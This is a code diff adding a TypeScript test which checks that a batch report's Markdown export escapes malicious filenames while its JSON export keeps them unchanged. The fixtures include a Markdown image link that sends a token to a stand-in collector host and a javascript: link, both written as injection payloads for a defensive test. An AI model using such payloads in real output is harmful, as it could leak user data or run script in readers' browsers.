@@ -104,3 +104,33 @@ test('DOM exports never turn an unconfirmed result into a V1 failure or skipped 
   }
  }
 });
+
+
+test('RG-07 DOM Markdown export escapes filename images, scripted links and emphasis without changing JSON identity',()=>{
+ const names=[
+  '![DOM_PRIVATE_IMAGE](https:collector.invalid?token=DOM_PRIVATE_QUERY).user.js',
+  '[DOM_ACTION](javascript:alert(1)).user.js',
+  '*DOM_PRIVATE_EMPHASIS*.user.js',
+ ];
+ const input:BatchDomResult={...sample,totalItems:names.length,
+  items:names.map((name,index)=>({...sample.items[0]!,index,path:'/isolated-fixture/'+name}))};
+ const rendered=serializeDomBatchReport(input,'markdown','2026-10-13T06:40:00.000Z');
+ assert.doesNotMatch(rendered,/\\|\\s*!\\[DOM_PRIVATE_IMAGE\\]\\(https:collector\\.invalid/,
+  'user-selected filename must not render an external Markdown image');
+ assert.doesNotMatch(rendered,/\\|\\s*\\[DOM_ACTION\\]\\(javascript:/,
+  'user-selected filename must not render a scripted Markdown link');
+ assert.doesNotMatch(rendered,/\\|\\s*\\*DOM_PRIVATE_EMPHASIS\\*/,
+  'user-selected filename must not render emphasis markup');
+ assert.ok(rendered.includes('\\\\!\\\\[DOM\\\\_PRIVATE\\\\_IMAGE\\\\]\\\\(https:collector.invalid'),
+  'image syntax must be escaped as visibly ordinary filename text');
+ assert.ok(rendered.includes('\\\\[DOM\\\\_ACTION\\\\]\\\\(javascript:'),
+  'link syntax must be escaped as visibly ordinary filename text');
+ assert.ok(rendered.includes('\\\\*DOM\\\\_PRIVATE\\\\_EMPHASIS\\\\*'),
+  'emphasis must remain inert filename text');
+ const json=JSON.parse(serializeDomBatchReport(input,'json','2026-10-13T06:40:00.000Z'));
+ assert.deepEqual(json.items.map((item:{name:string})=>item.name),names,
+  'JSON must preserve the original basenames for unambiguous user review');
+ assert.ok(json.items.every((item:{verification:{V3:string;V4:string}})=>
+  item.verification.V3==='not-configured'&&item.verification.V4==='not-configured'),
+  'escaping cannot elevate DOM-only evidence to V3/V4');
+});
